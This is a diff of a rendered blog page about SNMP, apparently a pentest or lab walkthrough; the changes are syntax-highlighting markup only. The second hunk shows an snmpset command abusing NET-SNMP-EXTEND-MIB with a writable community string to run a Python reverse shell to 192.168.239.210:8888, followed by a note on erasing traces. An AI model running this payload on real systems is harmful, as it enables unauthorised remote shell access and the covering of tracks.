@@ -329,19 +329,19 @@ sudo cp onesixtyone /usr/local/bin/
 <h3 id="install-and-configure">Install and configure</h3>
 <p>For some reasons, I found that adding on <strong>/etc/snmp/snmpd.conf</strong> additional mbdirs, did not work out.
 It is important to comment out any row starting with <code>mibs:</code> in the configuration file or the translation won&rsquo;t work.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo apt install snmp snmp-mibs-downloader
-<span style="color:#6272a4"># sudo /usr/bin/download-mibs</span>
-<span style="color:#6272a4"># tells Ubuntu to load SNMP MIB files:</span>
-sudo sed -i <span style="color:#f1fa8c">&#39;s/mibs :/# mibs :/g&#39;</span> /etc/snmp/snmp.conf
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt install snmp snmp-mibs-downloader
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># sudo /usr/bin/download-mibs</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># tells Ubuntu to load SNMP MIB files:</span>
+</span></span><span style="display:flex;"><span>sudo sed -i <span style="color:#f1fa8c">&#39;s/mibs :/# mibs :/g&#39;</span> /etc/snmp/snmp.conf
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>This will install <code>iana</code> and <code>ietf</code> common MIBS extensions, but you may want to find another source for <code>cisco</code> and other systems. This can be added in <strong>/usr/share/snmp/mibs/</strong> directory.</p>
 <h3 id="verify-your-installation">verify your installation</h3>
@@ -532,19 +532,19 @@ NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;evilcommand&quot;.1 = STRING: hello w
 nsExtendExecType.&quot;monitoring&quot; = INTEGER: exec(1)
 </code></pre>
 <p>However, if <code>nsExtendExecType = shell(2)</code> , you cannot use a one line bash reverse shell but a python/perl reverse shell work just fine. Get a reverse shell with python:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">snmpset <span style="color:#ff79c6">-</span>m <span style="color:#ff79c6">+</span>NET<span style="color:#ff79c6">-</span>SNMP<span style="color:#ff79c6">-</span>EXTEND<span style="color:#ff79c6">-</span>MIB <span style="color:#ff79c6">-</span>v <span style="color:#bd93f9">2</span>c <span style="color:#ff79c6">-</span>c c0nfig localhost \
-    <span style="color:#f1fa8c">&#39;nsExtendStatus.&#34;evilcommand&#34;&#39;</span>  <span style="color:#ff79c6">=</span> createAndGo \
-    <span style="color:#f1fa8c">&#39;nsExtendCommand.&#34;evilcommand&#34;&#39;</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">bin</span><span style="color:#ff79c6">/</span>python \
-    <span style="color:#f1fa8c">&#39;nsExtendArgs.&#34;evilcommand&#34;&#39;</span>    <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;-c &#34;import sys,socket,os,pty;s=socket.socket();s.connect((</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">192.168.239.210</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">,8888));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">/bin/sh</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">)&#34;&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>snmpset <span style="color:#ff79c6">-</span>m <span style="color:#ff79c6">+</span>NET<span style="color:#ff79c6">-</span>SNMP<span style="color:#ff79c6">-</span>EXTEND<span style="color:#ff79c6">-</span>MIB <span style="color:#ff79c6">-</span>v <span style="color:#bd93f9">2</span>c <span style="color:#ff79c6">-</span>c c0nfig localhost \
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;nsExtendStatus.&#34;evilcommand&#34;&#39;</span>  <span style="color:#ff79c6">=</span> createAndGo \
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;nsExtendCommand.&#34;evilcommand&#34;&#39;</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">bin</span><span style="color:#ff79c6">/</span>python \
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;nsExtendArgs.&#34;evilcommand&#34;&#39;</span>    <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;-c &#34;import sys,socket,os,pty;s=socket.socket();s.connect((</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">192.168.239.210</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">,8888));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">/bin/sh</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">)&#34;&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>And we can delete our traces with the <code>destroy</code>, which will delete our command.</p>
 <pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
